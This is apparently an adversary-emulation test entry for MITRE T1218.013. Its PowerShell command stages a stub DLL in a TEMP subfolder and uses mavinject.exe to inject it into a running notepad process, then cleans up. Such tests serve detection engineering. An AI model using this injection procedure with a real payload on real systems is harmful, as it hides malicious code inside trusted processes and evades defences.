  - name: T1218.013 - Mavinject Process Injection from Staged Temporary Subdirectory
    auto_generated_guid: bc0c990b-2f7f-4e7a-ab6a-82f27cd78a10
    description: |
      Simulates staging a DLL inside a deeply nested temp directory before passing it to mavinject.exe for process injection.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: true
      command: |
        $stageDir = "$env:TEMP\MavStage"; if (-not (Test-Path $stageDir)) { New-Item -Path $stageDir -ItemType Directory -Force | Out-Null }; $dll = "$stageDir\staged_payload.dll"; [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)); $proc = Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id /INJECTRUNNING $dll; Write-Host "[+] Staged directory Mavinject payload injected."
      cleanup_command: |
        $stageDir = "$env:TEMP\MavStage"; if (Test-Path $stageDir) { Remove-Item $stageDir -Recurse -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up staging directory."

